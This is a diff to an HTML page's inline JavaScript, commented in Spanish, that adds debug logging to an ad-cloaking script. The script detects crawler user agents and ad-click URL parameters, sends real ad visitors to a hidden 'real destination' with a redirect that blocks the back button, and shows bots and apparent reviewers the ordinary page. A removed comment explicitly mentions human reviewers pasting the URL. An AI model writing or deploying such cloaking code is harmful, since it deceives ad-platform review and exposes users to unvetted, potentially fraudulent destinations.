@@ -33,12 +33,15 @@
         // ============================================
         function esUserAgentBot() {
             const ua = navigator.userAgent.toLowerCase();
+            console.log('User-Agent detectado:', ua); // Depuración
             return CONFIG.userAgentsBloqueados.some(bot => ua.includes(bot));
         }
 
         function tieneParametrosDeAd() {
             const urlParams = new URLSearchParams(window.location.search);
-            return CONFIG.parametrosDeAd.some(param => urlParams.has(param));
+            const tieneAd = CONFIG.parametrosDeAd.some(param => urlParams.has(param));
+            console.log('¿Tiene parámetros de anuncio?', tieneAd); // Depuración
+            return tieneAd;
         }
 
         // ============================================
@@ -47,24 +50,27 @@
         
         // 1. Decisión instantánea
         const esBot = esUserAgentBot();
-        const esUsuarioReal = tieneParametrosDeAd() || !esBot; // Si no es bot y no viene de ad, puede ser un revisor pegando la URL. Lo tratamos como "no redirigir" por seguridad.
+        const esUsuarioReal = tieneParametrosDeAd() || !esBot;
+
+        console.log('Es bot:', esBot); // Depuración
+        console.log('Es usuario real:', esUsuarioReal); // Depuración
 
         // 2. Si es un usuario real, redirigir ANTES de que se renderice nada.
         if (!esBot && tieneParametrosDeAd()) {
+            console.log('Redirigiendo a:', CONFIG.destinoReal); // Depuración
             // Usamos window.location.replace para que no se pueda volver atrás con el botón del navegador.
             // Esto es lo más rápido y limpio posible.
             window.location.replace(CONFIG.destinoReal);
-            // Detenemos la ejecución del resto del script. No se necesita nada más.
             return;
         }
 
-        // 3. Si es un bot o un caso ambiguo, permitimos que la página cargue normalmente.
-        // El código que sigue a este script (CSS, contenido) se ejecutará.
-        // Para mayor limpieza, podemos ocultar el body temporalmente y mostrarlo con JS,
-        // pero para un bot, esto no es estrictamente necesario.
-        
+        // 3. Si es un bot o un caso ambiguo, permitir que la página cargue normalmente.
+        // (Si se desea ocultar el body temporalmente para no mostrar contenido mientras el script se ejecuta)
+        // Se puede agregar un efecto visual aquí si es necesario.
     
-    </script>
+    })();
+</script>
+
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
